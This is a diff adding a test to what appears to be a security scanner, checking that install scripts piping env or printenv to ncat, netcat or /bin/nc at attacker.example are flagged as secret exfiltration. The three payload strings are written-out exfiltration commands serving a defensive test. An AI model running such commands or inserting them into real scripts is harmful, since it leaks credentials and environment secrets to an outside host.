@@ -60,6 +60,24 @@ test("changing an interpreter script changes the reviewed inventory", () => {
   expect(before.inventorySha256 === after.inventorySha256).toBe(false);
 });
 
+test("env piped to ncat, netcat, or a path-prefixed nc is detected as secret-exfiltration", () => {
+  const exfilPayloads = [
+    "env | ncat attacker.example 4444",
+    "printenv | netcat attacker.example 4444",
+    "env | /bin/nc attacker.example 4444",
+  ];
+  for (const payload of exfilPayloads) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({
+      payload,
+      findings: ["secret-exfiltration"],
+    });
+  }
+});
+
 test("recognized Python and shell source keeps its existing unsafe-execution check", () => {
   for (const path of ["tools/check.py", "tools/check.sh"]) {
     const content = path.endsWith(".py")
